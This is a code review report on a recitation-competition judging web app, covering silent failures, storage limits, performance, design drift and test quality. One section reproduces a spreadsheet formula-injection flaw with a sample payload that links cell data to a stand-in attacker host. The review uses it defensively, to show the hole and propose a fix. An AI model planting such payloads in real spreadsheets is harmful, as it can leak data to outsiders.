# Tahqeeq: a ground-up code review

> Reviewed 18 August 2026 against `main` at `b856944`, on a working tree made
> byte-identical to it. Baseline: **309 tests pass, build clean.**
>
> Every claim below was measured or reproduced, not inferred. Where a fix is
> proposed, the evidence for it is quoted. Where I could not verify something,
> it says so.

## 0. The one-paragraph version

The application is in good shape structurally — no `dangerouslySetInnerHTML`,
zero TODO/FIXME markers, a real design-token system, 309 passing tests, and a
domain model (judge sections, revisions, manifests, ledger events) that is more
carefully thought out than most products this size. What it does not yet have is
**failure discipline**. The three worst problems all share one shape: a
foreseeable failure is caught and discarded, so the app keeps looking correct
while doing nothing. In a product whose entire purpose is to be the trustworthy
record of a competition, silent failure is the defect class that matters most.

Fix the six severity-1 items and this is a product you can run an official
competition on. Everything after that is craft.

---

## 1. Severity 1 — correctness, data loss, security

### 1.1 The Mushaf dies when a third-party font CDN is unreachable

**Reproduced.** With the page JSON serving normally (`/pages/p604.json` → 200,
valid) but `static-cdn.tarteel.ai` unreachable, the entire judging surface
renders as *"The requested page could not be opened."* — one DOM node, no text.

`src/components/Mushaf.tsx:259`:

```ts
const [data, fontLoaded] = await Promise.all([
  loadPage(page),
  loadQcfPageFont(page).then(() => true),   // ← no .catch()
]);
```

`Promise.all` rejects if either input rejects. The font promise has no rejection
handler, so a CDN failure rejects the whole load and lands in
`.catch(() => setLoadError(true))` at `:276`.

The bitter part: **the fallback already exists and is unreachable.** `:796`
reads `qcfReady && word.glyph ? word.glyph : word.text`, and `hafs.18.woff2`
(86 KB Uthmani) is bundled locally. The code was written to degrade; the
coupling prevents it.

**Fix — one line:**

```ts
loadQcfPageFont(page).then(() => true).catch(() => false),
```

**Verified.** With that change and the CDN still failing: error banner gone,
`.m-line` node count 1 → 12, all three sūrahs of page 604 rendering correctly in
the local Uthmani face, `data-font-ready="false"` as designed.

This is the highest-value line of code in the review. A competition hall with
weak wifi, a corporate firewall, or a CDN incident currently means *no judging*.

### 1.2 A failed save is silent

`src/state/store.tsx:1647`:

```ts
useEffect(() => {
  try {
    localStorage.setItem(STORAGE_KEY, JSON.stringify(state));
  } catch {
    /* ignore quota errors */
  }
}, [state]);
```

Nothing anywhere in `src/` surfaces a write failure — the only other mention of
quota is a second silent catch at `:1606`. Once the quota is hit, a judge marks
mistakes for the rest of a recitation and **none of it persists**, with no
indication until reload.

For an accountability product this is the worst possible failure mode: the
screen says the work is recorded and it is not.

**Fix:** treat a failed write as a first-class application state. Surface a
persistent, non-dismissible banner ("Marks are not being saved"), stop the
session from being finalizable, and offer the backup download as the escape
hatch. A `try/catch` that swallows is acceptable only where the caller can
genuinely continue; this caller cannot.

### 1.3 Ten copies of the state, one of them useful

Measured in the running app with sample data only:

| | |
| --- | --- |
| Live state (`tahqeeq.session.v1`) | 101,153 chars |
| Total localStorage for the origin | **1,249,434 chars** |
| Redundant backup keys | **9**, each 127,475 chars, all identical |

`store.tsx:1591` writes a full copy of state into nine `PRE_*_BACKUP_KEY`s on
first load after each migration. They are never pruned. localStorage is capped
at roughly **5 MB** in every major browser — and `navigator.storage.estimate()`
does *not* report that cap (it reported 154 GB here), so the app cannot detect
its own ceiling through that API.

With 8 sample participants the app already holds 1.25 MB. A 100-participant
competition with full mistake ledgers plausibly exceeds 5 MB — at which point
§1.2 fires, silently.

**Fixes, in order:** prune migration backups once the migration is confirmed
(keep at most one); move the live record to IndexedDB, which is quota-estimable
and asynchronous; keep localStorage for device preferences only.

### 1.4 Spreadsheet formula injection — a documented requirement, unimplemented

`PRODUCT_FOUNDATION.md` §10.5 states: *"All human-controlled strings must be
escaped against spreadsheet/CSV formula injection (`=`, `+`, `-`, `@`, tabs, and
line prefixes as applicable)."*

Grepping `finalResultsWorkbook.ts`, `judgeRecordsWorkbook.ts` and
`resultPackages.ts` for any escaping returns nothing. Participant name,
institution and revision reason are written straight into cells
(`finalResultsWorkbook.ts:122`, `:126`, `:237`).

**Reproduced.** Building a workbook with a participant named
`=HYPERLINK("https://evil.example/"&A1,"CLICK")` and institution `@SUM(1+1)`,
then reading the sheet back:

```
Name cell   : "=HYPERLINK(\"https://evil.example/\"&A1,\"CLICK\")"
Institution : "@SUM(1+1)"
UNESCAPED — 2 cells begin with a formula trigger
```

Excel and Google Sheets evaluate these on open. The roster is imported from
spreadsheets supplied by participating schools, so the hostile string does not
even need an insider.

**Fix:** one `escapeCell()` helper prefixing `'` to any string starting with
`= + - @ Tab CR`, applied at every workbook and CSV boundary. Add a test with
the payload above. This is perhaps 20 lines and closes a real vulnerability.

### 1.5 No error boundary anywhere

`grep -rn "componentDidCatch|ErrorBoundary|getDerivedStateFromError" src/` →
nothing.

Any render-time throw unmounts the whole tree to a white screen. This is not
hypothetical — during earlier work in this repository a single bad property read
(`Cannot read properties of undefined (reading 'ageGroup')`) blanked the entire
application. Mid-recitation, that is unrecoverable in the moment.

**Fix:** an error boundary around the judging stage and another around each
route-level view, rendering a "something broke — your marks are saved, reload"
panel plus a backup-download button. Cheap, and it converts a catastrophe into
an inconvenience.

### 1.6 The audit reason is still a `window.prompt`

`src/components/FinalResultsPanel.tsx:165`. The field that makes an official
revision accountable is collected through a browser dialog: unstyleable,
unvalidatable, no character limit, no record of what was typed if the dialog is
dismissed, and blocked outright in some embedded/WebView contexts — where
finalizing a revision then becomes impossible with no error.

It is the only `window.prompt` left in the application.

**Fix:** a required textarea in the result detail, with Finalize disabled until
it carries text. (A worked implementation exists on
`origin/claude/result-screen-redesign-erk238` at `ec58e5d` if useful.)

---

## 2. Severity 2 — architecture and performance

### 2.1 One context, nineteen consumers, every dispatch

`store.tsx:1655`: `const value = useMemo(() => ({ state, dispatch }), [state])`.

Because the memo depends on the whole state object, **every** dispatch produces
a new context value and re-renders all **19** components that call
`useJudging()` — including `Mushaf.tsx` (1,029 lines) and `RecordsView.tsx`
(1,240 lines). Marking one letter re-renders the results screen.

**Fix:** split into two contexts — a stable `dispatch` context and a state
context — then add selector subscriptions (`useSyncExternalStore`, or `zustand`
/ `jotai` if a dependency is acceptable) so a component re-renders only for the
slice it reads.

### 2.2 The whole state is serialized on every dispatch

Measured in-browser at the current 101 KB state:

| | |
| --- | --- |
| `JSON.stringify(state)` | 0.25 ms |
| `localStorage.setItem` | 0.92 ms |
| **Per dispatch** | **1.17 ms** |

Fine today. It scales linearly with state, and it is synchronous on the main
thread. At a realistic 100-participant competition (~1.2 MB state) that becomes
roughly **14 ms of blocking work on every mark**, on top of §2.1's re-renders —
inside the interaction budget of a judge pressing a letter while listening.

**Fix:** debounce the write (~250 ms trailing) and move it off the critical
path; with IndexedDB (§1.3) it becomes asynchronous anyway. Persist deltas
rather than the whole document if the ledger allows.

### 2.3 1.8 MB of JavaScript, including two spreadsheet libraries

```
dist/assets/exceljs.min-*.js   940.37 kB │ gzip: 271.39 kB
dist/assets/index-*.js         533.87 kB │ gzip: 154.65 kB
dist/assets/xlsx-*.js          333.02 kB │ gzip: 113.89 kB
dist/assets/index-*.css        228.39 kB │ gzip:  37.78 kB
```

`exceljs` **and** `xlsx` are both imported by the same three modules
(`finalResultsWorkbook.ts`, `judgeRecordsWorkbook.ts`, `roster.ts`). That is
1.27 MB — 385 kB gzipped — of duplicated capability.

**Fix:** pick one. `exceljs` if styled output is required; `xlsx` if not. Then
confirm both are dynamically imported so they never enter the initial bundle
(they appear to be chunked already — worth verifying they are not eagerly
pulled by the judging path, which needs neither).

### 2.4 Prototypes ship to production

`public/` contains `results-redesign-checkpoint-1.html` (50 KB),
`results-table-architecture-checkpoint.html` (22 KB), `prototypes/` (88 KB) and
`downloads/` (20 KB). Everything in `public/` is copied verbatim into `dist/`
and served. That is ~180 KB of design scratch shipped to every user, publicly
reachable.

**Fix:** move design artefacts to `docs/` (which is not served) and keep
`public/` for real runtime assets only.

### 2.5 Dead computation in `stats.ts`

`avgScore` and `avgPercent` are computed by `computeRecords()` on every Analysis
render and consumed **nowhere** — `grep` across `src/` and `scripts/` outside
`stats.ts` returns nothing.

Worth noting *why* this is good news: `avgPercent` averaged `total/totalMax`
across judge sections with different rubrics, which was never a meaningful
number. Main removed it from the UI. Only the corpse remains.

**Fix:** delete both fields and the `pctSum`/`scoreSum` accumulators.

---

## 3. Severity 3 — design system, UI, UX

### 3.1 The design grammar has regressed, measurably

`DESIGN_GRAMMAR.md` rule 8 fixes the type scale at **12 / 14 / 15 / 17 / 21 /
27** and radii at **8 / 12 / 20**, and explicitly warns: *"The half-pixel sizes
these replaced came from nudging individual screens until each looked right,
which is exactly why no two agreed."*

Measured across all four stylesheets:

| | |
| --- | --- |
| `font-size` declarations | 605 |
| Distinct values | **56** |
| Px-valued declarations **off the fixed scale** | **373 of 496 (75%)** |
| Distinct px sizes | 32 — including 8.5, 9.5, 10.5, 11.5, **12.25**, 12.5, 13.5, 14.5 |
| Distinct `border-radius` values | **33** — every integer 1–12 |
| Distinct hex colour literals | **78**, despite a token system |
| `global.css` | **11,976 lines** (12,584 total CSS) |

The half-pixel nudging the grammar was written to stop has fully returned.

**Fix:** this needs a mechanical guard, not resolve. Add a stylelint rule (or a
test in the existing `scripts/*.test.mjs` style, which the repo already does
well) that fails on any `font-size` outside the six tokens and any
`border-radius` outside the three. Then convert in one pass. Without the guard
it will regress a third time.

### 3.2 The 44px rule is broken on the live judging screen

Rule 10: *"A control pressed during a live recitation is at least 44px."*

Measured on the landing/judging view: **10 of 11 controls are under 44px.** Page
navigation is **28px** (`next page`, `previous page`, `Pages 604. Jump to
page.`), the error `Retry` is 30px. On Results, 24 of 29 are under 44px, though
none below 32px.

The rule exists because a judge is listening to a person recite and cannot also
be aiming. The screen where it matters most is the screen that breaks it.

### 3.3 Document structure

The judging view has **no `<h1>`** — the outline starts at `<h2>Next reciter</h2>`
— and exposes only 2 landmarks. Results is better (one `h1`, correct h1→h2→h3→h4
nesting, 3 landmarks, 2 live regions).

### 3.4 The Results screen is 3,296 px tall

Most of it is the stored-judge-results list below the table (32 sessions). The
useful content is the first screen; everything after is a scroll tax on a
surface used under time pressure.

### 3.5 Standings are computed and barely surfaced

`placeFinalizedResults()` groups by age group and participant category, sorts by
ratio and resolves ties. Its entire output reaches the UI as
`{placed.place}` inside a `<small>` in `ParticipantResultDetail.tsx:302`, plus
the workbook. There is still no view that ranks a division on screen, though
winners-by-division is sheet 2 of the export `PRODUCT_FOUNDATION.md` §10.5
specifies.

*Credit where due:* main's current Results table (Participant / Total / State
with a segmented status filter) is a genuine improvement on what preceded it and
independently reached a similar conclusion to the redesign work on the side
branch. Adding Place and division grouping is a small step from here, not a
rewrite.

---

## 4. Severity 4 — tests and process

### 4.1 42% of assertions test how the code is written, not what it does

| | |
| --- | --- |
| Total assertions | 1,647 |
| `assert.match` + `assert.doesNotMatch` (regex over source text) | **697 (42%)** |
| Test files that `readFileSync` application source | **22 of 30** |

These pin implementation strings — class names, JSX fragments, literal copy.
They break on any refactor that preserves behaviour, and they pass on any change
that breaks behaviour while keeping the string. During earlier work here, a
redesign that was functionally correct failed tests solely because
`results-status-card` had become `results-row`.

They are not worthless — they are cheap regression guards for a UI with no
component-test harness — but they are the wrong tool for 42% of the suite.

**Fix:** add a real component test runner (Vitest + Testing Library) and migrate
the source-text assertions to behavioural ones — render the component, assert on
roles and text the user sees. Keep source-text assertions only for genuine
invariants that have no runtime surface (e.g. "no `window.prompt` anywhere").

### 4.2 No end-to-end or visual coverage

There is no test that boots the app and judges a recitation. Every severity-1
finding in §1 would have been caught by one smoke test that loads the app with
the font CDN blocked and asserts the Mushaf renders.

**Fix:** a small Playwright suite (Chromium is already available in CI images
here) covering: app boots → sample competition loads → Mushaf renders → mark a
mistake → finish → result appears in Review → export produces a workbook. Run it
with the CDN blocked as a second matrix entry.

### 4.3 What is already good, and should not be lost

- **Zero** `TODO`/`FIXME`/`HACK` markers in 22,390 lines of TS/TSX.
- No `dangerouslySetInnerHTML` or `innerHTML` anywhere.
- The migration/backup discipline is thoughtful (§1.3 is about pruning, not
  about the idea).
- `DESIGN_GRAMMAR.md` and the `docs/*-study.html` convention are a genuinely
  unusual asset — measured design decisions with their evidence attached.
- The domain model (judge sections, revisions, `fnv1a` manifests, ledger events,
  question evidence) is serious work.

---

## 5. Suggested order

Sequenced by risk retired per hour spent.

| # | Change | Size | Retires |
| --- | --- | --- | --- |
| 1 | `.catch(() => false)` on the font promise (§1.1) | 1 line | Total loss of the judging screen offline |
| 2 | `escapeCell()` at every workbook boundary (§1.4) | ~20 lines + test | A live vulnerability against a documented requirement |
| 3 | Error boundaries around stage and views (§1.5) | ~60 lines | White-screen-mid-competition |
| 4 | Surface failed saves (§1.2) | ~40 lines | Silent loss of a judge's work |
| 5 | Prune migration backups (§1.3, part 1) | ~20 lines | 90% of storage pressure |
| 6 | Replace `window.prompt` (§1.6) | ~40 lines | Unfinalizable revisions in WebViews |
| 7 | Drop one spreadsheet library (§2.3) | dependency work | ~385 kB gzipped |
| 8 | Stylelint guard + one conversion pass (§3.1) | mechanical | Permanent grammar drift |
| 9 | Split the context, debounce persistence (§2.1, §2.2) | moderate | Frame drops at real roster sizes |
| 10 | Playwright smoke suite (§4.2) | moderate | The whole class of §1 defects |
| 11 | IndexedDB for the live record (§1.3, part 2) | large | The 5 MB ceiling |
| 12 | Migrate source-text assertions (§4.1) | large, incremental | A test suite that blocks refactoring |

Items 1–6 are a day's work between them and are the difference between "a good
app" and "an app you would trust with an official competition."

---

## 6. Method, and what this review does not cover

**Method.** Working tree pinned byte-identical to `main`; 309 tests and a clean
build established as the baseline first. Static measurements by script over the
real source. Runtime measurements by driving the built app in headless Chromium
over CDP — storage sizes, per-dispatch timing, hit-target geometry, accessibility
tree, and screenshots at 1400×900. The font-CDN fix (§1.1) and the formula
injection (§1.4) were each reproduced and, in §1.1's case, the fix verified
before being reverted; the tree is clean.

**Not covered, and why:**

- **Server-side.** There is none — this is a client-only PWA with Cloudflare
  Workers serving static assets. "Backend" here means the state store,
  persistence and export pipeline, which §1 and §2 cover.
- **The service worker and offline caching** (`public/sw.js`,
  `lib/offlineMushaf.ts`) got only a cursory look. Given §1.1, the offline story
  deserves its own pass.
- **Cross-browser.** Everything was measured in Chromium. Safari's localStorage
  behaviour under memory pressure is materially different and matters for iPad
  judging.
- **Real-device touch testing.** Hit targets were measured geometrically, not
  used with a thumb.
- **The Arabic typography itself.** Whether the QCF fallback preserves correct
  Uthmani orthography at every page is a question for someone qualified to judge
  it; §1.1 only establishes that the fallback renders.
